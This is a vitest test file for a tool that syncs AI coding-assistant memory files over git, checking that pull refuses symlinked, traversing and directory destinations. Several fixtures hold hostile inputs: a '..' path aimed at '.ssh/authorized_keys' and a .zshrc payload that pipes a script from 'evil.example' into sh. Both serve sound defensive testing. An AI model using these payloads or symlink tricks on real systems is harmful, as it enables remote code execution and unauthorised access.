import { describe, it, expect, vi } from "vitest";
import {
  mkdtempSync,
  mkdirSync,
  writeFileSync,
  readFileSync,
  existsSync,
  readdirSync,
  rmSync,
  symlinkSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { LocalBareGitBackend } from "../../src/backends/local-bare-backend.js";
import { pushProject } from "../../src/sync-engine/push.js";
import { pullProject } from "../../src/sync-engine/pull.js";
import { claudeCodeDetector, encodeClaudeProjectPath } from "../../src/detectors/claude-code.js";
import { cursorDetector } from "../../src/detectors/cursor.js";
import type { Detector } from "../../src/types.js";

// Lets individual tests inject extra synthetic "cloned files" into pullProject's
// readProjectFilesFromClone results without touching the real filesystem. This is
// how the literal-".."-segment defense-in-depth test below constructs a scenario
// that a real git clone/checkout could never produce on disk (git's own checkout
// rejects writing a tracked entry literally named ".."), while still exercising
// the exact code path in pullProject that receives a relativeKeyPath and hands it
// to assertSafeKeyPath before any detector or filesystem call.
const extraClonedProjectFiles = vi.hoisted(() => ({
  files: [] as { relativeKeyPath: string; content: Buffer }[],
}));

vi.mock("../../src/sync-engine/clone-writer.js", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../../src/sync-engine/clone-writer.js")>();
  return {
    ...actual,
    readProjectFilesFromClone: (cloneDir: string, projectKey: string) => [
      ...actual.readProjectFilesFromClone(cloneDir, projectKey),
      ...extraClonedProjectFiles.files,
    ],
  };
});

describe("pullProject", () => {
  it("restores project files to their detector-resolved local path (new-machine restore, no registry needed)", async () => {
    const sourceProjectDir = mkdtempSync(join(tmpdir(), "memsync-srcproj-"));
    const sourceHome = mkdtempSync(join(tmpdir(), "memsync-srchome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pushCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pushclone-")), "repo");
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    try {
      const encoded = encodeClaudeProjectPath(sourceProjectDir);
      mkdirSync(join(sourceHome, ".claude", "projects", encoded, "memory"), { recursive: true });
      writeFileSync(join(sourceHome, ".claude", "projects", encoded, "memory", "MEMORY.md"), "restored content");

      const pushBackend = new LocalBareGitBackend(bareDir, pushCloneDir);
      await pushBackend.initRemote();
      await pushBackend.ensureLocalClone();
      await pushProject(
        { backend: pushBackend, detectors: [claudeCodeDetector], homeDir: sourceHome, registryPath: join(sourceHome, "registry.json"), lockPath: join(sourceHome, "repo.lock") },
        sourceProjectDir,
        "acme/widgets",
      );

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.ensureLocalClone();
      const result = await pullProject(
        { backend: pullBackend, detectors: [claudeCodeDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
      );

      expect(result.fastForward).toBe(true);
      const restoredPath = join(targetHome, ".claude", "projects", encodeClaudeProjectPath(targetProjectDir), "memory", "MEMORY.md");
      expect(readFileSync(restoredPath, "utf8")).toBe("restored content");
      // A file that is genuinely written must be reported as changed, and must not
      // simultaneously be reported as unsafely skipped.
      expect(result.changedFiles).toContain("claude/MEMORY.md");
      expect(result.skippedUnsafe).not.toContain("claude/MEMORY.md");
    } finally {
      rmSync(sourceProjectDir, { recursive: true, force: true });
      rmSync(sourceHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pushCloneDir, { recursive: true, force: true });
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
    }
  });

  it("dry-run reports changed files without writing anything", async () => {
    const sourceProjectDir = mkdtempSync(join(tmpdir(), "memsync-srcproj-"));
    const sourceHome = mkdtempSync(join(tmpdir(), "memsync-srchome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pushCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pushclone-")), "repo");
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    try {
      const encoded = encodeClaudeProjectPath(sourceProjectDir);
      mkdirSync(join(sourceHome, ".claude", "projects", encoded, "memory"), { recursive: true });
      writeFileSync(join(sourceHome, ".claude", "projects", encoded, "memory", "MEMORY.md"), "dry run content");

      const pushBackend = new LocalBareGitBackend(bareDir, pushCloneDir);
      await pushBackend.initRemote();
      await pushBackend.ensureLocalClone();
      await pushProject(
        { backend: pushBackend, detectors: [claudeCodeDetector], homeDir: sourceHome, registryPath: join(sourceHome, "registry.json"), lockPath: join(sourceHome, "repo.lock") },
        sourceProjectDir,
        "acme/widgets",
      );

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.ensureLocalClone();
      const result = await pullProject(
        { backend: pullBackend, detectors: [claudeCodeDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
        { dryRun: true },
      );

      expect(result.changedFiles.length).toBeGreaterThan(0);
      expect(result.changedFiles).toContain("claude/MEMORY.md");
      expect(result.skippedUnsafe).not.toContain("claude/MEMORY.md");
      const restoredPath = join(targetHome, ".claude", "projects", encodeClaudeProjectPath(targetProjectDir), "memory", "MEMORY.md");
      expect(existsSync(restoredPath)).toBe(false);
    } finally {
      rmSync(sourceProjectDir, { recursive: true, force: true });
      rmSync(sourceHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pushCloneDir, { recursive: true, force: true });
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
    }
  });

  it("dry-run applies the same destination safety gate as a real pull, reporting a symlinked destination as skipped rather than as a change", async () => {
    // `--dry-run` is the preview users rely on to decide whether to pull at all. If
    // the gate that a real pull applies runs only on the write path, dry-run
    // advertises a file as "would change" that a real pull then silently refuses —
    // the two must agree on what is safe.
    const sourceProjectDir = mkdtempSync(join(tmpdir(), "memsync-srcproj-"));
    const sourceHome = mkdtempSync(join(tmpdir(), "memsync-srchome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pushCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pushclone-")), "repo");
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    const escapeTarget = mkdtempSync(join(tmpdir(), "memsync-escape-"));
    try {
      const encoded = encodeClaudeProjectPath(sourceProjectDir);
      mkdirSync(join(sourceHome, ".claude", "projects", encoded, "memory"), { recursive: true });
      writeFileSync(join(sourceHome, ".claude", "projects", encoded, "memory", "MEMORY.md"), "incoming content");
      writeFileSync(join(sourceHome, ".claude", "projects", encoded, "memory", "NOTES.md"), "incoming notes");

      const pushBackend = new LocalBareGitBackend(bareDir, pushCloneDir);
      await pushBackend.initRemote();
      await pushBackend.ensureLocalClone();
      await pushProject(
        { backend: pushBackend, detectors: [claudeCodeDetector], homeDir: sourceHome, registryPath: join(sourceHome, "registry.json"), lockPath: join(sourceHome, "repo.lock") },
        sourceProjectDir,
        "acme/widgets",
      );

      const tgtMemoryDir = join(targetHome, ".claude", "projects", encodeClaudeProjectPath(targetProjectDir), "memory");
      mkdirSync(tgtMemoryDir, { recursive: true });
      // Two destinations a real pull refuses: a (dangling) symlink and a directory.
      symlinkSync(join(escapeTarget, "stolen.md"), join(tgtMemoryDir, "MEMORY.md"));
      mkdirSync(join(tgtMemoryDir, "NOTES.md"), { recursive: true });

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.ensureLocalClone();
      const result = await pullProject(
        { backend: pullBackend, detectors: [claudeCodeDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
        { dryRun: true },
      );

      expect(result.skippedUnsafe).toContain("claude/MEMORY.md");
      expect(result.changedFiles).not.toContain("claude/MEMORY.md");
      expect(result.skippedUnsafe).toContain("claude/memory/NOTES.md");
      expect(result.changedFiles).not.toContain("claude/memory/NOTES.md");
      // Still a dry run: nothing written through the link, nothing created.
      expect(existsSync(join(escapeTarget, "stolen.md"))).toBe(false);
      expect(readdirSync(escapeTarget)).toHaveLength(0);
    } finally {
      rmSync(sourceProjectDir, { recursive: true, force: true });
      rmSync(sourceHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pushCloneDir, { recursive: true, force: true });
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
      rmSync(escapeTarget, { recursive: true, force: true });
    }
  });

  it("backs up an overwritten file as .bak before writing the new content", async () => {
    const sourceProjectDir = mkdtempSync(join(tmpdir(), "memsync-srcproj-"));
    const sourceHome = mkdtempSync(join(tmpdir(), "memsync-srchome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pushCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pushclone-")), "repo");
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    try {
      const srcEncoded = encodeClaudeProjectPath(sourceProjectDir);
      mkdirSync(join(sourceHome, ".claude", "projects", srcEncoded, "memory"), { recursive: true });
      writeFileSync(join(sourceHome, ".claude", "projects", srcEncoded, "memory", "MEMORY.md"), "new content");

      const pushBackend = new LocalBareGitBackend(bareDir, pushCloneDir);
      await pushBackend.initRemote();
      await pushBackend.ensureLocalClone();
      await pushProject(
        { backend: pushBackend, detectors: [claudeCodeDetector], homeDir: sourceHome, registryPath: join(sourceHome, "registry.json"), lockPath: join(sourceHome, "repo.lock") },
        sourceProjectDir,
        "acme/widgets",
      );

      const tgtEncoded = encodeClaudeProjectPath(targetProjectDir);
      const tgtMemoryDir = join(targetHome, ".claude", "projects", tgtEncoded, "memory");
      mkdirSync(tgtMemoryDir, { recursive: true });
      writeFileSync(join(tgtMemoryDir, "MEMORY.md"), "old local content");

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.ensureLocalClone();
      await pullProject(
        { backend: pullBackend, detectors: [claudeCodeDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
      );

      expect(readFileSync(join(tgtMemoryDir, "MEMORY.md"), "utf8")).toBe("new content");
      expect(readFileSync(join(tgtMemoryDir, "MEMORY.md.bak"), "utf8")).toBe("old local content");
    } finally {
      rmSync(sourceProjectDir, { recursive: true, force: true });
      rmSync(sourceHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pushCloneDir, { recursive: true, force: true });
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
    }
  });

  it("refuses to write through a pre-existing symlinked ancestor that escapes allowedRoots, without creating anything at the escaped target", async () => {
    const sourceProjectDir = mkdtempSync(join(tmpdir(), "memsync-srcproj-"));
    const sourceHome = mkdtempSync(join(tmpdir(), "memsync-srchome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pushCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pushclone-")), "repo");
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    // A directory entirely outside both targetHome and targetProjectDir — the escape target.
    const escapeTarget = mkdtempSync(join(tmpdir(), "memsync-escape-"));
    try {
      const encoded = encodeClaudeProjectPath(sourceProjectDir);
      mkdirSync(join(sourceHome, ".claude", "projects", encoded, "memory"), { recursive: true });
      writeFileSync(join(sourceHome, ".claude", "projects", encoded, "memory", "MEMORY.md"), "attacker content");

      const pushBackend = new LocalBareGitBackend(bareDir, pushCloneDir);
      await pushBackend.initRemote();
      await pushBackend.ensureLocalClone();
      await pushProject(
        { backend: pushBackend, detectors: [claudeCodeDetector], homeDir: sourceHome, registryPath: join(sourceHome, "registry.json"), lockPath: join(sourceHome, "repo.lock") },
        sourceProjectDir,
        "acme/widgets",
      );

      // Before pulling, make the intermediate ".claude" segment under the target home a symlink
      // pointing outside both allowedRoots (targetHome, targetProjectDir). resolveLocalPath will
      // still compute a path lexically nested under targetHome/.claude/..., but the *real*
      // filesystem location that path resolves through is escapeTarget.
      symlinkSync(escapeTarget, join(targetHome, ".claude"));

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.ensureLocalClone();

      let result;
      await expect(
        (async () => {
          result = await pullProject(
            { backend: pullBackend, detectors: [claudeCodeDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
            targetProjectDir,
            "acme/widgets",
          );
        })(),
      ).resolves.not.toThrow();

      expect(result!.fastForward).toBe(true);

      // Nothing should have been created inside the escape target: the symlinked ".claude"
      // segment is an existing ancestor that fails containment, so no mkdirSync/writeFileSync
      // for this file's subpath is ever attempted.
      expect(readdirSync(escapeTarget)).toHaveLength(0);
      expect(existsSync(join(escapeTarget, "projects"))).toBe(false);

      // The rejected file must be reported as unsafely skipped, and must NOT also be
      // reported as a successfully restored change — regardless of the fact that no
      // actual unsafe write occurred, callers of PullResult must not see the same file
      // in both changedFiles and skippedUnsafe.
      expect(result!.skippedUnsafe).toContain("claude/MEMORY.md");
      expect(result!.changedFiles).not.toContain("claude/MEMORY.md");
    } finally {
      rmSync(sourceProjectDir, { recursive: true, force: true });
      rmSync(sourceHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pushCloneDir, { recursive: true, force: true });
      rmSync(targetProjectDir, { recursive: true, force: true });
      // targetHome/.claude is a symlink pointing at escapeTarget. rmSync with recursive:true on
      // a symlink-to-directory removes only the symlink entry itself (Node's fs.rm does not
      // follow symlinks for removal), so this does not touch escapeTarget's contents.
      rmSync(join(targetHome, ".claude"), { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
      rmSync(escapeTarget, { recursive: true, force: true });
    }
  });

  it("reports a file no registered detector can resolve in PullResult.skippedUnsafe instead of dropping it silently", async () => {
    const sourceProjectDir = mkdtempSync(join(tmpdir(), "memsync-srcproj-"));
    const sourceHome = mkdtempSync(join(tmpdir(), "memsync-srchome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pushCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pushclone-")), "repo");
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    try {
      const encoded = encodeClaudeProjectPath(sourceProjectDir);
      mkdirSync(join(sourceHome, ".claude", "projects", encoded, "memory"), { recursive: true });
      writeFileSync(join(sourceHome, ".claude", "projects", encoded, "memory", "MEMORY.md"), "resolvable content");

      const pushBackend = new LocalBareGitBackend(bareDir, pushCloneDir);
      await pushBackend.initRemote();
      await pushBackend.ensureLocalClone();
      await pushProject(
        { backend: pushBackend, detectors: [claudeCodeDetector], homeDir: sourceHome, registryPath: join(sourceHome, "registry.json"), lockPath: join(sourceHome, "repo.lock") },
        sourceProjectDir,
        "acme/widgets",
      );

      // Add a file under the project key that no *registered* detector namespace
      // recognizes, bypassing pushProject/detector logic entirely by writing
      // straight into the push clone and using the backend's own push() directly
      // (a legitimate lower-level GitRemoteBackend call, not sync-engine logic).
      // This models a file synced from a machine that had an extra tool detector
      // (e.g. "cursor") that the pulling machine does not have registered.
      writeFileSync(join(pushCloneDir, "acme%2Fwidgets%2Funknown-tool%2Ffile.txt"), "from an unregistered detector");
      await pushBackend.push();

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.ensureLocalClone();
      const result = await pullProject(
        { backend: pullBackend, detectors: [claudeCodeDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
      );

      expect(result.fastForward).toBe(true);
      expect(result.skippedUnsafe).toContain("unknown-tool/file.txt");
      // The recognizable file still restores normally alongside the skip.
      const restoredPath = join(targetHome, ".claude", "projects", encodeClaudeProjectPath(targetProjectDir), "memory", "MEMORY.md");
      expect(readFileSync(restoredPath, "utf8")).toBe("resolvable content");
    } finally {
      rmSync(sourceProjectDir, { recursive: true, force: true });
      rmSync(sourceHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pushCloneDir, { recursive: true, force: true });
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
    }
  });

  it("refuses to write through a pre-existing dangling symlink at the destination, leaving the symlink's out-of-bounds target untouched", async () => {
    const sourceProjectDir = mkdtempSync(join(tmpdir(), "memsync-srcproj-"));
    const sourceHome = mkdtempSync(join(tmpdir(), "memsync-srchome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pushCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pushclone-")), "repo");
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    // Entirely outside both targetHome and targetProjectDir — where the symlink points.
    const escapeTarget = mkdtempSync(join(tmpdir(), "memsync-escape-"));
    try {
      const encoded = encodeClaudeProjectPath(sourceProjectDir);
      mkdirSync(join(sourceHome, ".claude", "projects", encoded, "memory"), { recursive: true });
      writeFileSync(join(sourceHome, ".claude", "projects", encoded, "memory", "MEMORY.md"), "attacker content");

      const pushBackend = new LocalBareGitBackend(bareDir, pushCloneDir);
      await pushBackend.initRemote();
      await pushBackend.ensureLocalClone();
      await pushProject(
        { backend: pushBackend, detectors: [claudeCodeDetector], homeDir: sourceHome, registryPath: join(sourceHome, "registry.json"), lockPath: join(sourceHome, "repo.lock") },
        sourceProjectDir,
        "acme/widgets",
      );

      // The destination DIRECTORY is legitimate and passes containment; only the final
      // destination FILE is a symlink, and a DANGLING one — so existsSync(dest) is
      // false, the .bak backup step never triggers, and writeFileSync would follow the
      // link and write gist content outside every allowed root.
      const tgtMemoryDir = join(targetHome, ".claude", "projects", encodeClaudeProjectPath(targetProjectDir), "memory");
      mkdirSync(tgtMemoryDir, { recursive: true });
      const stolenPath = join(escapeTarget, "stolen.md");
      symlinkSync(stolenPath, join(tgtMemoryDir, "MEMORY.md"));
      expect(existsSync(stolenPath)).toBe(false);

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.ensureLocalClone();
      const result = await pullProject(
        { backend: pullBackend, detectors: [claudeCodeDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
      );

      expect(result.fastForward).toBe(true);
      expect(result.skippedUnsafe).toContain("claude/MEMORY.md");
      expect(result.changedFiles).not.toContain("claude/MEMORY.md");
      // Nothing was written through the link, and the link itself was left alone
      // (not renamed to .bak either).
      expect(existsSync(stolenPath)).toBe(false);
      expect(readdirSync(escapeTarget)).toHaveLength(0);
      expect(readdirSync(tgtMemoryDir)).toEqual(["MEMORY.md"]);
    } finally {
      rmSync(sourceProjectDir, { recursive: true, force: true });
      rmSync(sourceHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pushCloneDir, { recursive: true, force: true });
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
      rmSync(escapeTarget, { recursive: true, force: true });
    }
  });

  it("refuses to overwrite a destination that is a pre-existing directory", async () => {
    // Defense in depth for the same write-loop gate as the dangling-symlink case
    // above: assertSafeKeyPath already rejects the empty-segment keys that made a
    // detector resolve to a directory, so this exercises the write loop's own lstat
    // gate independently, via a detector that resolves a perfectly safe key to a
    // directory path.
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    const dirDetector: Detector = {
      name: "dir-detector",
      findProjectFiles: () => [],
      findGlobalFiles: () => [],
      resolveLocalPath: (relativeKeyPath: string, projectDir: string) => {
        if (relativeKeyPath === "claude/MEMORY.md") return join(projectDir, "notes");
        throw new Error(`cannot resolve ${relativeKeyPath}`);
      },
    };
    extraClonedProjectFiles.files = [
      { relativeKeyPath: "claude/MEMORY.md", content: Buffer.from("attacker content") },
    ];
    try {
      const notesDir = join(targetProjectDir, "notes");
      mkdirSync(notesDir);
      writeFileSync(join(notesDir, "keep.md"), "precious");

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.initRemote();
      await pullBackend.ensureLocalClone();
      const result = await pullProject(
        { backend: pullBackend, detectors: [dirDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
      );

      expect(result.skippedUnsafe).toContain("claude/MEMORY.md");
      expect(result.changedFiles).not.toContain("claude/MEMORY.md");
      // The directory must be intact — not renamed to notes.bak, not replaced by a file.
      expect(readFileSync(join(notesDir, "keep.md"), "utf8")).toBe("precious");
      expect(existsSync(`${notesDir}.bak`)).toBe(false);
    } finally {
      extraClonedProjectFiles.files = [];
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
    }
  });

  it("rejects a trailing-separator relativeKeyPath that would resolve to the memory directory itself", async () => {
    // "claude/memory/" splits to ["claude", "memory", ""]; the empty final segment
    // used to pass assertSafeKeyPath, and claude-code's
    // join(memoryDir, key.slice(prefix.length)) then resolved it back to memoryDir —
    // the user's real memory DIRECTORY. The write loop renamed that directory to
    // .bak and wrote a regular file in its place, reported as a normal change.
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    extraClonedProjectFiles.files = [
      { relativeKeyPath: "claude/memory/", content: Buffer.from("attacker content") },
    ];
    try {
      const encoded = encodeClaudeProjectPath(targetProjectDir);
      const memoryDir = join(targetHome, ".claude", "projects", encoded, "memory");
      mkdirSync(memoryDir, { recursive: true });
      writeFileSync(join(memoryDir, "MEMORY.md"), "existing local memory");

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.initRemote();
      await pullBackend.ensureLocalClone();
      const result = await pullProject(
        { backend: pullBackend, detectors: [claudeCodeDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
      );

      expect(result.skippedUnsafe).toContain("claude/memory/");
      expect(result.changedFiles).not.toContain("claude/memory/");
      // The memory directory must still be a directory with its contents intact,
      // and no sibling "memory.bak" may have been created.
      expect(readFileSync(join(memoryDir, "MEMORY.md"), "utf8")).toBe("existing local memory");
      expect(readdirSync(dirname(memoryDir))).toEqual(["memory"]);
    } finally {
      extraClonedProjectFiles.files = [];
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
    }
  });

  it("rejects a relativeKeyPath containing a literal .. segment via the defense-in-depth assertSafeKeyPath check, without writing anything", async () => {
    // A real git clone/checkout can never produce a tracked file literally named
    // "..", so this scenario is constructed by injecting a synthetic cloned file
    // directly (see the vi.mock at the top of this file) rather than via a real
    // push/pull round-trip. This exercises the exact defense-in-depth line added
    // to pullProject — an assertSafeKeyPath(relativeKeyPath) call made before the
    // value is ever handed to a detector — independent of whatever upstream
    // GitRemoteBackend produced the value.
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    extraClonedProjectFiles.files = [
      { relativeKeyPath: "claude/memory/../../../../.ssh/authorized_keys", content: Buffer.from("evil") },
    ];
    try {
      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.initRemote();
      await pullBackend.ensureLocalClone();

      const result = await pullProject(
        { backend: pullBackend, detectors: [claudeCodeDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
      );

      expect(result.fastForward).toBe(true);
      expect(result.skippedUnsafe).toContain("claude/memory/../../../../.ssh/authorized_keys");
      expect(existsSync(join(targetHome, ".ssh", "authorized_keys"))).toBe(false);
    } finally {
      extraClonedProjectFiles.files = [];
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
    }
  });

  it("refuses to write through a symlinked intermediate directory pointing INSIDE $HOME, leaving the real home file untouched and un-backed-up", async () => {
    // The escaping-symlink test above is NOT this case. There the link left every
    // allowed root, so realpath containment caught it. Here the hostile repo ships
    // `.cursor/rules` as a link to $HOME — a root memsync allows on purpose, because
    // Claude Code's project memory legitimately lives deep under it. Containment then
    // says yes, the destination lstats as an ordinary regular file (the OS followed the
    // link long before the final component), and pull overwrites the user's REAL
    // ~/.zshrc with gist content, dutifully creating a .bak first and reporting a
    // completely normal-looking success. The next shell session runs attacker code.
    //
    // ".zshrc" is a perfectly valid relativeKeyPath — no traversal, no empty segment —
    // so assertSafeKeyPath has no grounds to reject it. Only a per-segment symlink walk
    // anchored to the same root as the containment check stops this.
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
    const pullCloneDir = join(mkdtempSync(join(tmpdir(), "memsync-pullclone-")), "repo");
    extraClonedProjectFiles.files = [
      { relativeKeyPath: "cursor/rules/.zshrc", content: Buffer.from("curl http://evil.example/x.sh | sh\n") },
    ];
    try {
      const realZshrc = join(targetHome, ".zshrc");
      writeFileSync(realZshrc, "# the user's real shell config\n");
      mkdirSync(join(targetProjectDir, ".cursor"), { recursive: true });
      symlinkSync(targetHome, join(targetProjectDir, ".cursor", "rules"));

      const pullBackend = new LocalBareGitBackend(bareDir, pullCloneDir);
      await pullBackend.initRemote();
      await pullBackend.ensureLocalClone();
      const result = await pullProject(
        { backend: pullBackend, detectors: [cursorDetector], homeDir: targetHome, registryPath: join(targetHome, "registry.json"), lockPath: join(targetHome, "repo.lock") },
        targetProjectDir,
        "acme/widgets",
      );

      expect(result.fastForward).toBe(true);
      expect(result.skippedUnsafe).toContain("cursor/rules/.zshrc");
      expect(result.changedFiles).not.toContain("cursor/rules/.zshrc");
      // The real file must be byte-for-byte untouched, and no .bak may exist — a .bak
      // is proof the overwrite happened.
      expect(readFileSync(realZshrc, "utf8")).toBe("# the user's real shell config\n");
      expect(existsSync(`${realZshrc}.bak`)).toBe(false);
    } finally {
      extraClonedProjectFiles.files = [];
      // Remove the symlink entry itself before the recursive delete, so cleanup can
      // never reach through it into targetHome.
      rmSync(join(targetProjectDir, ".cursor", "rules"), { recursive: true, force: true });
      rmSync(targetProjectDir, { recursive: true, force: true });
      rmSync(targetHome, { recursive: true, force: true });
      rmSync(bareDir, { recursive: true, force: true });
      rmSync(pullCloneDir, { recursive: true, force: true });
    }
  });

  it("still writes a legitimate destination sitting directly under an allowed root, with zero intermediate segments", async () => {
    // cursor's `.cursorrules` resolves to projectDir/.cursorrules, so its nearest
    // existing ancestor IS projectDir — an allowed root. The symlink walk added for the
    // case above finds zero segments to inspect here; that must read as "safe", not as
    // "unverifiable, reject". Conflating the two would silently break the most ordinary
    // pull there is.
    const targetProjectDir = mkdtempSync(join(tmpdir(), "memsync-tgtproj-"));
    const targetHome = mkdtempSync(join(tmpdir(), "memsync-tgthome-"));
    const bareDir = mkdtempSync(join(tmpdir(), "memsync-bare-"));
